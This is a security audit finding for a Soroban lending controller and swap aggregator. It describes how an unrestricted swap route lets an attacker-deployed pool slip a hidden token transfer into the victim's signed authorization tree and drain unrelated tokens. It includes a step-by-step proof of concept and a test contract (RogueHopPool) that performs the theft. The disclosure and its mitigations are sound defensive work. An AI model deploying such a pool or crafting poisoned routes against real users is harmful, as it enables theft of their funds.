### Title
Malicious swap route can attach hidden token transfers to the caller’s authorization tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
The controller passes caller-supplied `swap` bytes to the configured swap aggregator without constraining the route to trusted pools. An attacker can therefore route through a malicious pool contract that performs an unrelated `token.transfer(victim, attacker, amount)` during the swap. Soroban simulation records that transfer as a child of the victim’s `swap_collateral`, `swap_debt`, `multiply`, or `repay_debt_with_collateral` authorization; if the victim submits the transaction with that recorded tree, the malicious pool steals tokens unrelated to the lending operation. This mirrors the CVE class: an apparently single-purpose user action embeds a hidden action that discloses or transfers more than the user intended.

### Finding Description
`swap_collateral` accepts an opaque `swap: Bytes` argument and forwards it to `process_swap_collateral` [1](#0-0) . Similar opaque route arguments are accepted by `swap_debt`, `multiply`, and `repay_debt_with_collateral` [2](#0-1) .

The swap helper authorizes only the controller’s exact input-token transfer to the configured router, then invokes `router.execute_strategy(controller, amount_in, swap)` [3](#0-2) . The aggregator decodes arbitrary `assets` and `ops` from the payload, resolves each hop’s `pool` address from that caller-controlled registry, and dispatches the selected venue [4](#0-3) [5](#0-4) . The venue adapters do not enforce that `pool` is a known deployment: for example, the Soroswap adapter invokes `get_reserves` and `swap` on the supplied address [6](#0-5) .

A malicious pool can execute another contract call inside its `swap` implementation. If that call is `token.transfer(victim, attacker, amount)`, the token invokes `victim.require_auth()` beneath the victim’s root controller authorization. The repository’s regression test demonstrates that simulation records the rogue transfer as a sub-invocation of the victim’s `swap_collateral` entry and that enforcing auth accepts it once that poisoned tree is signed [7](#0-6) [8](#0-7) . The measured input/output checks only bound the router’s balances and do not detect unrelated transfers authorized as children [9](#0-8) .

### Impact Explanation
An attacker can steal arbitrary SEP-41/Stellar-asset tokens held by a victim, including tokens never supplied to or listed by the lending protocol. The malicious route can still return the promised swap output, so the lending operation completes normally while the hidden token transfer pays the attacker. The demonstrated test moves the victim’s entire unrelated wallet-token balance to the attacker while also crediting the expected swap collateral [10](#0-9) .

This is theft of user funds. It does not merely produce a poor exchange rate: it authorizes a distinct transfer from the victim’s wallet through a nested contract controlled by the route creator.

### Likelihood Explanation
Exploitation requires the victim to sign a transaction whose recorded authorization tree contains the malicious child transfer. That requirement reduces likelihood because careful clients can inspect and reject unexpected children, but the controller and router expose arbitrary routes as ordinary bytes and provide no protocol-level pool allowlist or authorization-tree invariant. An attacker can deploy the malicious pool, fund it with enough output token to satisfy the route, and distribute the crafted `swap` payload through an interface, strategy preset, copied route, or phishing flow.

The issue is therefore most consistent with Medium severity: a user-interaction requirement exists, but successful exploitation can drain unrelated wallet assets rather than only manipulate the routed amount.

### Recommendation
Do not rely on users to detect malicious authorization children in an opaque route payload. Add a defense-in-depth control such as:

- Maintain a governance-approved venue/pool allowlist and reject route pool addresses not on it.
- Execute swaps through a constrained router callback/accounting model that cannot cause caller-authorizable side effects outside the declared input pull.
- Decode route venues in the controller and reject arbitrary pool addresses before invoking the aggregator.
- Require the transaction-building layer to enforce a strict expected authorization tree: exactly the controller entry and the expected input-token transfer, with no other sub-invocations.
- Emit route metadata and a hash in events so clients and monitors can detect nonstandard route contracts.

A pool registry is the strongest on-chain mitigation because balance-delta checks alone cannot observe unrelated child transfers that occur under the caller’s authorization tree.

### Proof of Concept
1. Victim supplies USDC and owns an unrelated token `X` in the same wallet.
2. Attacker deploys `MaliciousPool` configured with `(victim, token_x, attacker, amount)`.
3. `MaliciousPool.get_reserves()` returns reserves chosen so the Soroswap adapter computes a valid positive output.
4. `MaliciousPool.swap(...)` first calls `token_x.transfer(victim, attacker, amount)`, then transfers a valid `token_out` amount to the router so the measured-output checks pass.
5. Attacker constructs `swap_collateral(caller=victim, account_id=victim_account, current=USDC, amount=N, new=ETH, swap=malicious_payload)`, where `malicious_payload` selects the attacker’s pool address in the route’s `assets` registry.
6. Simulation records the victim’s authorization tree. It contains the root `swap_collateral` invocation plus a hidden child `token_x.transfer(victim, attacker, amount)`.
7. If the victim signs that tree, the transaction succeeds: the collateral swap completes and `amount` of `X` is transferred to the attacker.

The repository’s test fixture implements this sequence with `RogueHopPool::swap` calling `token.transfer(victim, attacker, amount)` [11](#0-10)  and confirms that the poisoned signed tree both completes the swap and drains the unrelated wallet token [8](#0-7) .

### Citations

**File:** contracts/controller/src/lib.rs (L255-277)
```rust
    /// Borrows `amount` of `new_debt`, converts it to `existing_debt` via `swap`
    /// and repays with the proceeds. Requires owner or delegate authorization.
    #[when_not_paused]
    fn swap_debt(
        env: Env,
        caller: Address,
        account_id: u64,
        existing_debt: HubAssetKey,
        amount: i128,
        new_debt: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_debt::process_swap_debt(
            &env,
            &caller,
            SwapDebtParams {
                account_id,
                existing_debt: &existing_debt,
                new_debt_amount: amount,
                new_debt: &new_debt,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/lib.rs (L283-302)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
        );
```

**File:** contracts/controller/src/strategies/swap.rs (L29-38)
```rust
    // Snapshot before router execution to measure its spend and output.
    let in_before = token_in_client.balance(&controller);
    let out_before = token::Client::new(env, token_out).balance(&controller);

    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L58-66)
```rust
    let StrategyPayload {
        amounts,
        assets,
        ops,
    } = payload;
    let program = Program::decode(&env, &ops, assets.len(), amounts.len());

    let input_token = assets.get_unchecked(program.token_in);
    let output_token = assets.get_unchecked(program.token_out);
```

**File:** contracts/swap-aggregator/src/execute/mod.rs (L152-166)
```rust
        Opcode::Swap(venue) => {
            let hop = SwapHop {
                pool: ctx.assets.get_unchecked(op.idx_a),
                token_in: ctx.assets.get_unchecked(op.idx_b),
                token_out: ctx.assets.get_unchecked(op.idx_c),
                venue,
            };
            let amount_in = resolve_amount(ctx, vault, op.mode, &hop.token_in, prev);
            if amount_in <= 0 {
                panic_with_error!(ctx.env, Error::InvalidAmount);
            }

            vault.withdraw(&hop.token_in, amount_in);
            let out = venues::dispatch_hop(ctx.env, ctx.router, &hop, amount_in, tokens_cache);
            if out <= 0 {
```

**File:** contracts/swap-aggregator/src/venues/soroswap.rs (L51-87)
```rust
pub(crate) fn swap(ctx: &HopContext<'_>) {
    let token_in_is_0 = ctx.hop.token_in < ctx.hop.token_out;

    let no_args: Vec<Val> = vec![ctx.env];
    let (reserve_0, reserve_1): (i128, i128) = ctx.env.invoke_contract(
        &ctx.hop.pool,
        &Symbol::new(ctx.env, "get_reserves"),
        no_args,
    );
    let (reserve_in, reserve_out) = if token_in_is_0 {
        (reserve_0, reserve_1)
    } else {
        (reserve_1, reserve_0)
    };

    let requested_out = soroswap_amount_out(ctx.env, ctx.amount_in, reserve_in, reserve_out);
    if requested_out <= 0 {
        panic_with_error!(ctx.env, Error::ZeroOutput);
    }

    let token_client = token::Client::new(ctx.env, &ctx.hop.token_in);
    token_client.transfer(ctx.router, &ctx.hop.pool, &ctx.amount_in);

    let (amount_0_out, amount_1_out) = if token_in_is_0 {
        (0_i128, requested_out)
    } else {
        (requested_out, 0_i128)
    };
    let args: Vec<Val> = vec![
        ctx.env,
        amount_0_out.into_val(ctx.env),
        amount_1_out.into_val(ctx.env),
        ctx.router.into_val(ctx.env),
    ];
    let _: () = ctx
        .env
        .invoke_contract(&ctx.hop.pool, &symbol_short!("swap"), args);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-227)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/swap-aggregator/src/venues/mod.rs (L42-58)
```rust
    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received
```
